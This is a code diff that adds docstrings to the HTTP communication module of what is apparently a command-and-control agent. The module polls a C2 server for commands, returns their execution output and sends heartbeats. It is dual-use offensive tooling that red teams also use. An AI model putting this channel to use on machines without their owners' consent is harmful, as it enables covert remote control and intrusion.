@@ -1,14 +1,39 @@
+"""
+Agent.protocols.http_comm
+
+Handles communication over HTTP for agent interaction with the C2 server.
+Supports polling for commands, sending output, sending messages, and heartbeat signals.
+"""
+#!/usr/bin/env python3
+
 import requests
 from ..logger import logger
 from base import BaseComm
 
 class HTTPComm(BaseComm):
+    """
+    Implements HTTP-based communication for the agent.
+    """
     def __init__(self, server_url: str, agent_id: str, auth_token: str):
+        """
+        Initializes the HTTP communication module.
+
+        Args:
+            server_url (str): The base URL of the C2 server.
+            agent_id (str): The unique identifier of the agent.
+            auth_token (str): Authentication token for secure communication.
+        """
         self.server_url = server_url.rstrip('/')
         self.agent_id = agent_id
         self.auth_token = auth_token
 
     def poll_commands(self):
+        """
+        Polls the C2 server for new commands.
+
+        Returns:
+            list: A list of received commands.
+        """
         try:
             url = f"{self.server_url}/api/agent/commands"
             params = {"agent_id": self.agent_id, "auth_token": self.auth_token}
@@ -22,6 +47,15 @@ class HTTPComm(BaseComm):
         return []
 
     def send_output(self, output: str) -> bool:
+        """
+        Sends command execution output to the C2 server.
+
+        Args:
+            output (str): The command execution result.
+
+        Returns:
+            bool: True if successful, False otherwise.
+        """
         try:
             url = f"{self.server_url}/api/agent/output"
             payload = {"agent_id": self.agent_id, "auth_token": self.auth_token, "output": output}
@@ -34,6 +68,15 @@ class HTTPComm(BaseComm):
         return False
 
     def send_message(self, message: str) -> str:
+        """
+        Sends a generic message to the C2 server.
+
+        Args:
+            message (str): The message to send.
+
+        Returns:
+            str: The response message received from the server.
+        """
         try:
             url = f"{self.server_url}/api/agent/message"
             payload = {"message": message}
@@ -46,6 +89,12 @@ class HTTPComm(BaseComm):
         return ""
 
     def heartbeat(self):
+        """
+        Sends a heartbeat signal to the C2 server.
+
+        Returns:
+            bool: True if the heartbeat was successfully sent, False otherwise.
+        """
         try:
             url = f"{self.server_url}/api/agent/heartbeat"
             payload = {"agent_id": self.agent_id, "auth_token": self.auth_token}
